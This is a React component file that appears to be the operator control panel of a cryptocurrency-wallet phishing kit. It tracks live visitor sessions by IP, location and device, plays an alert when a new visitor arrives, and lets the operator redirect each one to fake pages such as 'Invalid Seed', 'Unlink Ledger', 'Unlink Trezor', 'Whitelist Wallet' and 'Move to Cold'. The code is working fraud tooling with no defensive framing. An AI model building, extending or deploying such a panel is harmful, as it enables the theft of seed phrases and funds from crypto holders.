import React, { useState, useEffect, useRef } from 'react';
import { Ban, ExternalLink, Monitor, MapPin, Trash2 } from 'lucide-react';
import { useAdminSocket } from '../contexts/AdminSocket';
import notificationSound from './notification.mp3';

const ANIMAL_EMOJIS = [
  '🦊', '🦁', '🐯', '🐶', '🐱', '🐼', '🐨', '🐮', '🐷', '🐸',
  '🦄', '🐵', '🐰', '🦒', '🦘', '🦔', '🐻', '🐙', '🦈', '🐬',
  '🦭', '🦩', '🦥', '🦦', '🦡', '🦃', '🦆', '🦅', '🐺', '🐝'
];

const DeviceDetectorUtil = {
  browsers: {
    chrome: /chrome|chromium|crios/i,
    firefox: /firefox|fxios/i,
    safari: /safari/i,
    edge: /edg/i,
    opera: /opr|opera/i,
    ie: /trident|msie/i,
    brave: /brave/i,
    vivaldi: /vivaldi/i
  },
  operatingSystems: {
    windows: /windows/i,
    macos: /macintosh|mac os x/i,
    linux: /linux/i,
    ios: /iphone|ipad|ipod/i,
    android: /android/i,
    chromeos: /cros/i
  },
  detectBrowser(userAgent) {
    const ua = userAgent.toLowerCase();
    for (const [browser, regex] of Object.entries(this.browsers)) {
      if (regex.test(ua)) {
        return browser.charAt(0).toUpperCase() + browser.slice(1);
      }
    }
    return 'Unknown';
  },
  detectOS(userAgent) {
    const ua = userAgent.toLowerCase();
    for (const [os, regex] of Object.entries(this.operatingSystems)) {
      if (regex.test(ua)) {
        return os.charAt(0).toUpperCase() + os.slice(1);
      }
    }
    return 'Unknown';
  }
};

const getEmojiForSession = (sessionId) => {
  const num = parseInt(sessionId.slice(0, 8), 16);
  return ANIMAL_EMOJIS[num % ANIMAL_EMOJIS.length];
};

const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isNew }) => {
  const [selectedPage, setSelectedPage] = useState(session.currentPage || 'loading.html');
  const browser = DeviceDetectorUtil.detectBrowser(session.userAgent);
  const os = DeviceDetectorUtil.detectOS(session.userAgent);

  const formatPageName = (page) => {
    if (!page) return '';
    
    // Remove any path components and get just the filename
    const filename = page.split('/').pop();
    
    // Remove .html and handle both hyphen and normal case
    return filename
      .replace('.html', '')
      .replace(/([A-Z])/g, ' $1') // Add space before capital letters
      .split(/[-\s]/) // Split by hyphens or spaces
      .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
      .join(' ')
      .trim();
  };

  const actionIconStyle = "w-4 h-4";
  const actionButtonStyle = `
    p-2 rounded-lg transition-colors duration-200
    backdrop-blur-sm active:scale-95
  `;

  return (
    <div className={`
      relative p-4 mb-3
      bg-[#1A1A1A] rounded-lg border border-white/10
      ${isNew ? 'animate-highlight' : ''}
    `}>
      {/* Badge for review status */}
      {(session.reviewCompleted || session.selectedAmount) && (
        <div className="absolute -top-2 right-4 flex items-center space-x-2">
          {session.reviewCompleted && (
            <div className="inline-flex items-center px-1.5 py-[1px] rounded-full text-[10px] font-medium
                          bg-gradient-to-r from-green-500/5 to-green-500/10
                          ring-1 ring-green-500/20 text-green-400">
              Reviewed
            </div>
          )}
          {session.selectedAmount && (
            <div className="inline-flex items-center px-1.5 py-[1px] rounded-full text-[10px] font-medium
                          bg-gradient-to-r from-blue-500/5 to-blue-500/10
                          ring-1 ring-blue-500/20 text-blue-400">
              {session.selectedAmount}
            </div>
          )}
        </div>
      )}

      {/* Header Row */}
      <div className="flex items-center justify-between mb-3">
        <div className="flex items-center space-x-2">
          {settings.showEmojis ? (
            <span className="text-lg">{getEmojiForSession(session.id)}</span>
          ) : (
            <Monitor className="w-4 h-4 text-white/40" />
          )}
          <span className="text-sm font-medium text-white/80">{session.id}</span>
        </div>
        <StatusBadge 
          status={session.loading ? 'loading' : (session.connected ? 'connected' : 'inactive')} 
        />
      </div>

      {/* Info Rows */}
      <div className="space-y-2 mb-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <MapPin className="w-4 h-4 text-white/40" />
            <span className="text-sm text-white/60">
              {session.ip} • {session.city}, {session.country}
            </span>
          </div>
        </div>

        <div className="flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <span className="text-sm text-white/60">
              {os} • {browser}
            </span>
          </div>
          <HeartbeatIndicator lastHeartbeat={session.lastHeartbeat} />
        </div>

        <div className="bg-white/5 px-2 py-1 rounded-md inline-block">
          <span className="text-sm text-white/80">
            {formatPageName(session.currentPage)}
          </span>
        </div>
      </div>

      {/* Actions Row */}
      <div className="flex items-center justify-between mt-4">
        <CategorizedPageSelect
          selectedPage={selectedPage}
          onPageChange={setSelectedPage}
          isHovered={false}
        />
        
        <div className="flex items-center space-x-2">
          <button
            onClick={() => onRedirect(session.id, selectedPage)}
            className={`${actionButtonStyle} bg-blue-500/20 text-blue-400`}
            title="Redirect User"
          >
            <ExternalLink className={actionIconStyle} />
          </button>

          <button
            onClick={() => onRemove(session.id)}
            className={`${actionButtonStyle} bg-orange-500/20 text-orange-400`}
            title="Remove Session"
          >
            <Trash2 className={actionIconStyle} />
          </button>

          <button
            onClick={() => onBan(session.ip)}
            className={`${actionButtonStyle} bg-red-500/20 text-red-400`}
            title="Ban IP"
          >
            <Ban className={actionIconStyle} />
          </button>
        </div>
      </div>
    </div>
  );
};

const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered }) => {
  const pageCategories = {
    Introduction: [
      { id: 'loading.html', name: 'Loading' },
      { id: 'review.html', name: 'Review' },
      { id: 'estimatedbalance.html', name: 'Estimated Balance' },
      { id: 'whitelistwallet.html', name: 'Whitelist Wallet' }
    ],
    'Hardware Wallets': [
      { id: 'ledgerdisconnect.html', name: 'Unlink Ledger' },
      { id: 'trezordisconnect.html', name: 'Unlink Trezor' },
      { id: 'MoveToCold.html', name: 'Move to Cold' }
    ],
    Awaiting: [
      { id: 'Pendingreview.html', name: 'Pending Review' }
    ],
    'Completed Task': [
      { id: 'Completed.html', name: 'Review Completed' },
      { id: 'WhitelistSuccessful.html', name: 'Whitelist Successful' }
    ],
    Others: [
      { id: 'unlinkwallet.html', name: 'Unlink Wallet' },
      { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
      { id: 'InvalidSeed.html', name: 'Invalid Seed' }
    ]
  }

  return (
    <div className="relative flex-shrink-0" style={{ maxWidth: '180px' }}>
      <select
        value={selectedPage}
        onChange={(e) => onPageChange(e.target.value)}
        style={{ 
          transform: 'translate3d(0, 0, 0)',
          transformOrigin: 'top'
        }}
        className={`
          relative text-xs rounded-lg border w-full
          transition-all duration-300
          ${isHovered ? 'bg-white/[0.08] border-white/20' : 'bg-white/[0.05] border-white/10'}
          text-white/80 py-1 px-2
          backdrop-blur-sm
          focus:outline-none focus:border-blue-500/30 focus:ring-1 focus:ring-blue-500/20
          shadow-lg shadow-black/5
          z-50
        `}
      >
        {Object.entries(pageCategories).map(([category, pages]) => (
          <optgroup key={category} label={category} className="bg-[#1A1A1A] text-white/60">
            {pages.map(page => (
              <option key={page.id} value={page.id} className="bg-[#1A1A1A]">
                {page.name}
              </option>
            ))}
          </optgroup>
        ))}
      </select>
    </div>
  );
};

const HeartbeatIndicator = ({ lastHeartbeat }) => {
  const secondsAgo = Math.round((Date.now() - lastHeartbeat) / 1000);
  
  return (
    <div className="flex items-center space-x-2">
      <div className="relative">
        <div className="absolute -inset-0.5 rounded-full bg-red-500/20 animate-[pulse_2s_ease-in-out_infinite]" />
        <span className="relative text-red-400">❤</span>
      </div>
      <span className="text-white/60 text-sm">
        {secondsAgo}s ago
      </span>
    </div>
  );
};

const StatusBadge = ({ status }) => {
  const getStatusStyles = () => {
    if (status === 'loading') {
      return {
        base: 'bg-yellow-500/20 text-yellow-300 border-yellow-500/30',
        glow: 'from-yellow-500/10 to-transparent'
      };
    }
    if (status === 'connected') {
      return {
        base: 'bg-green-500/20 text-green-300 border-green-500/30',
        glow: 'from-green-500/10 to-transparent'
      };
    }
    return {
      base: 'bg-red-500/20 text-red-300 border-red-500/30',
      glow: 'from-red-500/10 to-transparent'
    };
  };

  // If loading is true, ignore connected state
  const getDisplayStatus = () => {
    if (status === 'loading') return 'Loading';
    if (status === 'connected') return 'Active';
    return 'Inactive';
  };

  const styles = getStatusStyles();

  return (
    <div className={`
      relative inline-flex px-2 py-1 rounded-full text-xs font-medium 
      border backdrop-blur-xl ${styles.base}
      shadow-lg shadow-black/5
      transition-all duration-300 group
    `}>
      <div className="absolute inset-0 rounded-full backdrop-blur-md" />
      <div className={`
        absolute inset-0 opacity-0 group-hover:opacity-100
        transition-opacity duration-500 blur-xl
        bg-gradient-to-r ${styles.glow}
      `} />
      <div className="relative flex items-center space-x-1">
        <div className="relative w-1.5 h-1.5">
          <div className="absolute inset-0 rounded-full bg-current" />
          {status === 'connected' && (
            <div className="absolute inset-0 rounded-full bg-current animate-[pulse_8s_ease-in-out_infinite] opacity-75" />
          )}
        </div>
        <span className="relative z-10">
          {getDisplayStatus()}
        </span>
      </div>
    </div>
  );
};

const SessionHeaderRow = () => {
  return (
    <div className="relative px-6 py-4">
      <div className="absolute inset-0 bg-white/[0.01] backdrop-blur-sm" />
      <div className="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-transparent opacity-0" />
      <div className="absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent opacity-0" />
      
      <div className="relative flex items-center justify-between">
        <div className="flex flex-col w-1/4">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Session Info
          </div>
        </div>
        <div className="w-1/6">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Device
          </div>
        </div>
        <div className="w-1/6">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Location
          </div>
        </div>
        <div className="w-1/6">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Current Page
          </div>
        </div>
        <div className="w-1/6">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Last Active
          </div>
        </div>
        <div className="w-1/6">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Status
          </div>
        </div>
        <div className="w-1/6">
          {/* Space for actions */}
        </div>
      </div>
    </div>
  );
};

const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
  const { settings } = useAdminSocket();
  const [selectedPage, setSelectedPage] = useState(session.currentPage || 'loading.html');
  const [isHovered, setIsHovered] = useState(false);

  const browser = DeviceDetectorUtil.detectBrowser(session.userAgent);
  const os = DeviceDetectorUtil.detectOS(session.userAgent);

  const formatPageName = (page) => {
    if (!page) return '';
    
    // First remove any path and get just the filename
    const filename = page.split('/').pop();
    
    // Special case handling for known pages
    const knownPages = {
      'whitelistwallet': 'Whitelist Wallet',
      'estimatedbalance': 'Estimated Balance',
      'pendingreview': 'Pending Review',
      'whitelistsuccessful': 'Whitelist Successful',
      'disconnectwallet': 'Disconnect Wallet',
      'unlinkwallet': 'Unlink Wallet',
      'movetocold': 'Move To Cold',
      'invalidseed': 'Invalid Seed',
      'ledgerdisconnect': 'Ledger Disconnect',
      'trezordisconnect': 'Trezor Disconnect',
      'loading': 'Loading',
      'review': 'Review'
    };
  
    // Remove .html and convert to lowercase for matching
    const baseName = filename.replace('.html', '').toLowerCase();
    
    return knownPages[baseName] || baseName;
  };

  return (
    <div 
      className={`
        group relative px-6 py-4 
        transition-all duration-500 
        ${isNew ? 'animate-highlight' : ''}
        hover:translate-y-[-1px]
        hover:shadow-[0_8px_16px_-6px_rgba(0,0,0,0.2)]
      `}
      onMouseEnter={() => setIsHovered(true)}
      onMouseLeave={() => setIsHovered(false)}
    >
      <div className="absolute inset-0 bg-white/[0.01] backdrop-blur-sm" />
      <div className={`absolute inset-0 bg-gradient-to-r from-blue-500/5 to-transparent
                     transition-opacity duration-500 ${isHovered ? 'opacity-100' : 'opacity-0'}`} />
      <div className={`absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent
                     transition-opacity duration-500 ${isHovered ? 'opacity-100' : 'opacity-0'}`} />

      <div className="relative flex items-center justify-between">
        <div className="flex flex-col w-1/4">
          <div className="flex items-center space-x-6">
            <div className="flex flex-col">
              <div className="flex items-center space-x-2">
                {settings.showEmojis ? (
                  <span className="text-xl w-4 h-4 flex items-center justify-center">
                    {getEmojiForSession(session.id)}
                  </span>
                ) : (
                  <Monitor className={`
                    w-4 h-4 text-white/40 transition-transform duration-300 
                    ${isHovered ? 'scale-110' : 'scale-100'}
                  `} />
                )}
                <span className="text-sm font-medium text-white/80">{session.id}</span>
              </div>
              {(session.reviewCompleted || session.selectedAmount) && (
                <div className="flex items-center space-x-2 mt-0.5 ml-6">
                  {session.reviewCompleted && (
                    <div className="inline-flex items-center px-1.5 py-[1px] rounded-full text-[10px] font-medium
                                  bg-gradient-to-r from-green-500/5 to-green-500/10
                                  ring-1 ring-green-500/20 text-green-400">
                      Reviewed
                    </div>
                  )}
                  {session.selectedAmount && (
                    <div className="inline-flex items-center px-1.5 py-[1px] rounded-full text-[10px] font-medium
                                  bg-gradient-to-r from-blue-500/5 to-blue-500/10
                                  ring-1 ring-blue-500/20 text-blue-400">
                      {session.selectedAmount}
                    </div>
                  )}
                </div>
              )}
            </div>
            <div className="flex items-center space-x-2">
              <MapPin className={`w-4 h-4 text-white/40 transition-transform duration-300 
                                ${isHovered ? 'scale-110' : 'scale-100'}`} />
              <span className="text-sm text-white/60">{session.ip}</span>
            </div>
          </div>
        </div>

        <div className="w-1/6">
          <div className="flex flex-col">
            <span className="text-sm text-white/80">{os}</span>
            <span className="text-xs text-white/60">{browser}</span>
          </div>
        </div>

        <div className="w-1/6">
          <span className="text-sm text-white/60">
            {session.city}, {session.country}
          </span>
        </div>

        <div className="w-1/6">
          <div className={`relative inline-flex items-center px-2 py-1 rounded-md 
                        overflow-hidden transition-all duration-300
                        ${isHovered ? 'translate-x-1' : ''}`}>
            <div className="absolute inset-0 bg-white/[0.08] backdrop-blur-xl" />
            <div className="absolute inset-0 bg-gradient-to-r from-white/[0.05] to-transparent" />
            <span className="relative text-sm font-medium text-white/90">
              {formatPageName(session.currentPage)}
            </span>
          </div>
        </div>

        <div className="w-1/6">
          <HeartbeatIndicator lastHeartbeat={session.lastHeartbeat} />
        </div>

        <div className="w-1/6">
          <StatusBadge 
            status={session.loading ? 'loading' : (session.connected || session.loading ? 'connected' : 'inactive')} 
          />
        </div>

        <div className="relative flex items-center justify-end space-x-4 w-1/6">
          <div className={`absolute inset-0 rounded-lg transition-opacity duration-300
                        ${isHovered ? 'opacity-100' : 'opacity-0'}`}>
            <div className="absolute inset-0 bg-white/[0.03] backdrop-blur-sm rounded-lg" />
            <div className="absolute inset-0 bg-gradient-to-r from-white/[0.02] to-transparent rounded-lg" />
          </div>

          <CategorizedPageSelect
            selectedPage={selectedPage}
            onPageChange={setSelectedPage}
            isHovered={isHovered}
          />

          <button
            onClick={() => onRedirect(session.id, selectedPage)}
            className={`relative p-1.5 rounded-lg transition-all duration-300 group/btn
                     hover:bg-white/[0.08] text-blue-400 hover:text-blue-300
                     backdrop-blur-sm shadow-lg shadow-black/5 active:scale-95`}
          >
            <ExternalLink className={`w-4 h-4 transition-transform duration-300
                                 ${isHovered ? 'scale-110' : 'scale-100'}`} />
          </button>
          
          <button
    onClick={() => onRemove(session.id)}
    className={`relative p-1.5 rounded-lg transition-all duration-300 group/btn
             hover:bg-white/[0.08] text-orange-400 hover:text-orange-300
             backdrop-blur-sm shadow-lg shadow-black/5 active:scale-95`}
  >
    <Trash2 className={`w-4 h-4 transition-transform duration-300
                     ${isHovered ? 'scale-110' : 'scale-100'}`} />
  </button>

          <button
            onClick={() => onBan(session.ip)}
            className={`relative p-1.5 rounded-lg transition-all duration-300 group/btn
                     hover:bg-white/[0.08] text-red-400 hover:text-red-300
                     backdrop-blur-sm shadow-lg shadow-black/5 active:scale-95`}
          >
            <Ban className={`w-4 h-4 transition-transform duration-300
                         ${isHovered ? 'scale-110' : 'scale-100'}`} />
          </button>
        </div>
      </div>
    </div>
  );
};

const SessionList = () => {
  // Add settings to the destructured values from useAdminSocket
  const { sessions, banIP, redirectUser, removeSession, settings } = useAdminSocket();
  const [isHovered, setIsHovered] = useState(false);
  const [newSessions, setNewSessions] = useState(new Set());
  const [heartbeatTick, setHeartbeatTick] = useState(0);
  const processedSessionsRef = useRef(new Set());
  const audioRef = useRef(new Audio(notificationSound));

  useEffect(() => {
    audioRef.current.preload = 'auto';
  }, []);

  useEffect(() => {
    const newSessionIds = sessions.filter(session => !processedSessionsRef.current.has(session.id))
                                .map(session => session.id);

    if (newSessionIds.length > 0) {
      audioRef.current.play().catch(err => console.error('Audio play error:', err));
      setNewSessions(new Set([...newSessionIds]));
      processedSessionsRef.current = new Set(sessions.map(s => s.id));

      const timer = setTimeout(() => setNewSessions(new Set()), 3000);
      return () => clearTimeout(timer);
    }
  }, [sessions]);

  useEffect(() => {
    const timer = setInterval(() => setHeartbeatTick(tick => tick + 1), 1000);
    return () => clearInterval(timer);
  }, []);

  const handleBanIP = (ip) => {
    if (window.confirm(`Are you sure you want to ban IP ${ip}?`)) {
      banIP(ip);
    }
  };

  const handleRemoveSession = (sessionId) => {
    if (window.confirm('Are you sure you want to remove this session?')) {
      removeSession(sessionId);
      redirectUser(sessionId, 'loading.html');
    }
  };

  return (
    <div className="mt-6">
      <div className="relative rounded-2xl overflow-hidden group"
           onMouseEnter={() => setIsHovered(true)}
           onMouseLeave={() => setIsHovered(false)}>
        <div className="absolute inset-0 bg-black/20 backdrop-blur-xl" />
        <div className="absolute inset-0 bg-white/[0.08] backdrop-blur-lg" />
        <div className="absolute inset-1 bg-gradient-to-b from-white/[0.05] to-transparent opacity-70" />
        <div className="absolute inset-0 shadow-2xl" />
        
        <div className="relative">
          <div className="px-6 py-4 border-b border-white/[0.06]">
            <div className="relative">
              <div className="absolute inset-0 bg-white/[0.02] backdrop-blur-sm rounded-lg" />
              <h2 className="relative text-lg font-medium text-white/90 
                         transition-transform duration-300
                         group-hover:translate-x-1">
                Active Sessions
              </h2>
            </div>
          </div>

          {/* Desktop View */}
          <div className="hidden lg:block">
            <SessionHeaderRow />
            <div className="divide-y divide-white/[0.06]">
              {sessions.map((session) => (
                <SessionRow 
                  key={session.id}
                  session={session}
                  onRedirect={redirectUser}
                  onBan={handleBanIP}
                  onRemove={handleRemoveSession}
                  isNew={newSessions.has(session.id)}
                />
              ))}
            </div>
          </div>

          <div className="block lg:hidden p-4">
        {sessions.map((session) => (
          <MobileSessionCard
            key={session.id}
            session={session}
            settings={settings}  // Now settings is defined and can be passed
            onRedirect={redirectUser}
            onBan={handleBanIP}
            onRemove={handleRemoveSession}
            isNew={newSessions.has(session.id)}
          />
        ))}
      </div>

          {/* Empty State */}
          {sessions.length === 0 && (
            <div className="px-6 py-8 text-center">
              <p className="text-white/60">No active sessions</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default SessionList;